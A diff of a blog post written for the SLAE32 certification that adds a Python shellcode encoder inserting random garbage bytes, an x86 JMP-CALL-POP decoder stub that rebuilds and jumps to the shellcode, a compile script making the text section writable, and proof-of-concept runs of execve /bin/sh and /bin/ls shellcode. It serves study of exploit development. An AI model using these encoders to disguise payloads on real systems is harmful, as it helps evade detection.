@@ -164,6 +164,18 @@ The encoding schema I have decided to go for a variation of the Insertion Encode
       <nav id="TableOfContents">
   <ul>
     <li><a href="#the-encoding-schema">The encoding schema</a></li>
+    <li><a href="#the-encoder">The encoder</a></li>
+    <li><a href="#the-decoder-skeleton">The decoder skeleton</a>
+      <ul>
+        <li><a href="#compiling">Compiling</a></li>
+      </ul>
+    </li>
+    <li><a href="#proof-of-concept">Proof of Concept</a>
+      <ul>
+        <li><a href="#execve-stack-sh">Execve-Stack-SH</a></li>
+        <li><a href="#execve-stack-ls">Execve-Stack-LS</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
     </div>
@@ -210,13 +222,162 @@ The encoding schema I have decided to go for a variation of the Insertion Encode
 <h2 id="the-encoding-schema">The encoding schema</h2>
 <p>I have decided to go for a variation of the Insertion Encoder, adding some randomness.
 After each byte of the shellcode, I add a byte which could range from 0x1 to 0x4 and states how many <em>garbage</em> bytes will follow. After last byte of the shellcode, <code>\xFF</code> is being added as a terminator marker.</p>
-<p><img src="img/slae/image.png" alt="image"></p>
+<p>In the image below, a simple visualization of the encoding schema is presented:
+<img src="/img/slae/slae4-01.png" alt="Encoding example"></p>
+<h2 id="the-encoder">The encoder</h2>
+<p>The encoding utility has been written in Python3. Its goal is to add the garbage bytes (0xAB) producing an output that can be then copied into the Decoder-Skeleton file.</p>
+<p>The original shellcode has to be inserted in the <code>shellcode</code> variable. The script the cycles through each byte of the shellcode adding the &lsquo;garbage counter&rsquo; variable (random between 1 and 4) and the garbage bytes according to the counter. After the last byte of the shellcode, &lsquo;0xFF&rsquo; is inserted as a terminator placeholder instead of the <em>garbage counter</em>.</p>
+<p>After this process, the script is printing on the screen the original shellcode and the encoded version.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> random
+
+<span style="color:#75715e"># Update here the shellcode to be encoded</span>
+shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x89\xc3\xb0\x01\xb3\x0C\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+
+separator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0xAB,&#39;</span>
+terminator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0xFF&#39;</span>
+notencoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(shellcode) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+	notencoded <span style="color:#f92672">+=</span> hex(shellcode[i])
+	encoded <span style="color:#f92672">+=</span> hex(shellcode[i]) <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span> 
+	separNum <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">4</span>)
+	encoded <span style="color:#f92672">+=</span> hex(separNum) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span>
+	encoded <span style="color:#f92672">+=</span> separator <span style="color:#f92672">*</span> separNum
+
+encoded <span style="color:#f92672">+=</span> hex(shellcode[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> terminator
+
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;--------------------------------------------------&#34;</span>)
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Shellcode encoding utility&#34;</span>)
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;--------------------------------------------------&#34;</span>)
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Original Shellcode:&#34;</span>)
+<span style="color:#66d9ef">print</span> (notencoded)
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;--------------------------------------------------&#34;</span>)
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Encoded version:&#34;</span>)
+<span style="color:#66d9ef">print</span> (encoded)
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;--------------------------------------------------&#34;</span>)
+</code></pre></div><h2 id="the-decoder-skeleton">The decoder skeleton</h2>
+<p>The decoding skeleton adopts the JMP-CALL-POP technique to get the address of the actual payload in memory.</p>
+<p>The registers are being used according to the following schema:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Register</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">ESI</td>
+<td>Used to store the start address of the string in memory</td>
+</tr>
+<tr>
+<td style="text-align:center">EAX</td>
+<td>Used (only AL) to load the &lsquo;garbage counter&rsquo; bytes</td>
+</tr>
+<tr>
+<td style="text-align:center">EBX</td>
+<td>Offset of the byte being scanned and handled</td>
+</tr>
+<tr>
+<td style="text-align:center">ECX</td>
+<td>Offset to the byte being rewritten in memory with the <em>actual</em> shellcode</td>
+</tr>
+<tr>
+<td style="text-align:center">EDX</td>
+<td>Used (only DL) to load actual shellcode byte to be then rewritten in memory</td>
+</tr>
+</tbody>
+</table>
+<p>After the JMP-CALL-POP, EAX to EDX are zeroed and then the loop starts:</p>
+<ul>
+<li>The first shellcode byte is legitimate, therefore EBX and ECX are incremented to start scanning through the string in memory;</li>
+<li><em>Garbage counter</em> byte is loaded into AL and compared with \xFF. If equal, it means that we have reached the end of the encoded shellcode and the code jumps to the &ldquo;Execute&rdquo; label;</li>
+<li>EBX is incremented to skip the <em>garbage counter</em> byte which we have already copied in AL;</li>
+<li>AL (number of next garbage bytes) is added to EBX to skip the garbage bytes themselves;</li>
+<li>Next actual shellcode byte (at offset EBX) is copied into DL;</li>
+<li>Content of DL (actual shellcode byte) is copied at offset ECX</li>
+</ul>
+<p>After the loop exits, the &ldquo;Execute&rdquo; section adds a final \x00 to the actual shellcode in memory and then performs a jump to the shellcode address (stored in ESI).</p>
+<pre><code>global _start			
+
+section .text
+
+_start:
+	jmp short ShellcodeIntoStack
+
+Decode:	
+	pop esi
+
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	xor edx, edx
+
+Loop:	
+	inc ebx
+	inc ecx
+	
+	mov byte al, [esi + ebx]
+	cmp eax, 0xFF
+	je Execute
+
+	inc ebx
+	add ebx, eax
+
+	mov BYTE dl, [esi + ebx]
+	mov BYTE [esi + ecx], dl
+
+	jmp short Loop
+	
+Execute:
+	xor edx, edx
+	mov [esi + ecx], dl
+	jmp esi  		;Leave control to decoded shellcode
+
+ShellcodeIntoStack:
+	call Decode
+	Shellcode: db &lt;INSERT-HERE-THE-SHELLCODE&gt;
+</code></pre><h3 id="compiling">Compiling</h3>
+<p>The .text section is being rewritten while executing the decoder, therefore we must compile with appropriate flags. For this reason, a patched version of <code>compile.sh</code> has been prepared:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+echo <span style="color:#e6db74">&#39;[+] Assembling with Nasm ... &#39;</span>
+nasm -f elf32 -o $1.o $1.nasm
+
+echo <span style="color:#e6db74">&#39;[+] Linking ...&#39;</span>
+ld -N -o $1 $1.o
+rm $1.o
+
+echo <span style="color:#e6db74">&#39;[+] Done!&#39;</span>
+</code></pre></div><p>According to the <a href="https://linux.die.net/man/1/ld">man page of ld</a>, <code>-N</code> option &ldquo;Set the text and data sections to be readable and writable. Also, do not page-align the data segment, and disable linking against shared libraries.&rdquo;</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>All Proof of Concept files are stored in the &ldquo;Encoded-Shellcodes&rdquo; subdirectory under &ldquo;Assignment-4&rdquo;.<br>
+I have tested two different Execve-Stack shellcodes, taken from the SLAE32 course material.</p>
+<p>For each of them the process has been the following:</p>
+<ul>
+<li>Creation of .nasm file starting from Course materials</li>
+<li>Compile the file with <code>compile.sh</code> tool (available on the GitHub repository)</li>
+<li>Extract the shellcode with <code>getShellcode.sh</code> tool (it automates extraction with <em>objdump</em> and subsequent string manipulations)</li>
+<li>Creation of appropriate <code>Encoder-&lt;NAME&gt;.py</code> adding the shellcode extracted at previous step; output of the file is redirected to <code>EncoderOutput-&lt;NAME&gt;.txt</code></li>
+<li><code>Decoder-&lt;NAME&gt;.nasm</code> file is created forking Decoder-Skeleton and adding the encoded shellcode; the file is then compiled using <code>compileExec.sh</code> and tested</li>
+</ul>
+<h3 id="execve-stack-sh">Execve-Stack-SH</h3>
+<p><code>Execve-Stack-SH</code> pushes onto the stack the command <code>//bin/sh</code> (additional / for padding purposes) and then executes it.<br>
+<img src="/img/slae/slae4-poc-sh.png" alt="Execve-Stack-SH PoC"></p>
+<h3 id="execve-stack-ls">Execve-Stack-LS</h3>
+<p><code>Execve-Stack-LS</code> pushes onto the stack the command <code>//bin/ls</code> (additional / for padding purposes) and then executes it.<br>
+<img src="/img/slae/slae4-poc-ls.png" alt="Execve-Stack-LS PoC"></p>
 <!-- raw HTML omitted -->
 <hr>
 <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>.</p>
-<p><strong>Student ID: <code>SLAE - 1547</code></strong></p>
-<!-- raw HTML omitted -->
-
+<p><strong>Student ID</strong>: <code>SLAE - 1547</code><br>
+<strong>GitHub repository</strong>: <a href="https://github.com/andrea-perfetti/SLAE32-Exam">https://github.com/andrea-perfetti/SLAE32-Exam</a></p>
+<p>This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ uname -a 
+Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
+</code></pre>
     </div>
   </article>
 
@@ -248,6 +409,18 @@ After each byte of the shellcode, I add a byte which could range from 0x1 to 0x4
       <nav id="TableOfContents">
   <ul>
     <li><a href="#the-encoding-schema">The encoding schema</a></li>
+    <li><a href="#the-encoder">The encoder</a></li>
+    <li><a href="#the-decoder-skeleton">The decoder skeleton</a>
+      <ul>
+        <li><a href="#compiling">Compiling</a></li>
+      </ul>
+    </li>
+    <li><a href="#proof-of-concept">Proof of Concept</a>
+      <ul>
+        <li><a href="#execve-stack-sh">Execve-Stack-SH</a></li>
+        <li><a href="#execve-stack-ls">Execve-Stack-LS</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
     </div>
